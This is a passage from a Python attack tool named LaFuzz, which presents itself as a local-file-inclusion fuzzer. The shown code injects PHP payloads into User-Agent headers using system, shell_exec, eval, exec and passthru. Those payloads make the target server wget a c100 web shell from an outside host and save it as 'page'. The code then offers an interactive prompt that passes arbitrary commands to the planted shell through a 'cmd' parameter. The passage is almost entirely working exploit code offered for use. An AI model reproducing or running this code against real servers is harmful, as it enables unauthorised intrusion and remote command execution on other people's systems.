    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    print("Code has been injected in a total of 5 requests!\nIf all went well you may have a shell waiting for you here:\n\n%s&&cmd={INJECT CODE HERE}" %(url))


def command_shell(site):
    end = "&&cmd="
    cmd = str(raw_input("shell~$: "))
    if cmd:
        try:
            mycmd = site + end + cmd
            print("injecting %s" %(cmd))
            req = urllib2.Request(mycmd)
            response = urllib2.urlopen(req, timeout=10)
            print("Command response: %s" %(response))

        except IOError as e:
            print("Error: %s" %(e)) 
    
        except KeyboardInterrupt:
            print("Exitting...")
            sys.exit(1)
    else:
        print("Error executing command. Check for the shell manually")



def exploit_environ(url):
    req = urllib2.Request(url)
    req.add_header("UserAgent: ","<? system('wget http://www.xfocus.net.ru/soft/c100.txt -O page'?>)")
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)
                    
    req = urllib2.Request(url)
    req.add_header("UserAgent: ","<?php shell_exec('wget http://www.xfocus.net.ru/soft/c100.txt -O page'?>")
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    req = urllib2.Request(url)
    req.add_header("UserAgent: ","<?php eval('wget http://www.xfocus.net.ru/soft/c100.txt -O page'?>")
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    req = urllib2.Request(url)
    req.add_header("UserAgent: ","<?php exec('wget http://www.xfocus.net.ru/soft/c100.txt -O page'?>")
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    req = urllib2.Request(url)
    req.add_header("UserAgent: ","<?php passthru('wget http://www.xfocus.net.ru/soft/c100.txt -O page'?>")
    req.add_header('Keep-Alive: ','115')
    req.add_header('Referer: ','http://'+url)
    response = urllib2.urlopen(req, timeout=10)

    print("Done in 5 requests.\n\nIf all went well c100 shell should be available in root folder named page: %s/page" %(url))



def info():
    print("""\n\n\t\tLaFuzz""")
    print("\t\tby m0le")
    print("\t\tBlack Tiger Security 1998 - 2012\n")
    print("\t[I]Descript: \n\tLaFuzz is an LFI fuzzer which is specify on Local File Incursion (LFI),")
    print("\tbut not just to exploit known vulnerabilities; LaFuzz takes a step forward onto")
    print("\texploiting unknown/0-day which is surrounding directory traversal's vectors.")
    print("\n\tThis fearsome tool is the Swiss blade for your survival kit in the digital ocean.\n\n")


def usage():
    print("\t[!]Usage")
    print("\tWritten from noob-friendly CLI skeleton,\n\tLaFuzz workflows are similar to SecScan.")
    print("\tEx: root$>%s\n" %(sys.argv[0]))
    print("Directions: To simply run the scan and follow the prompts:\n")

if __name__ == '__main__': 
    if sys.platform == "linux" or sys.platform == "linux2":
        os.system('clear')
    else:
        os.system('cls')

    sys.exit(main())
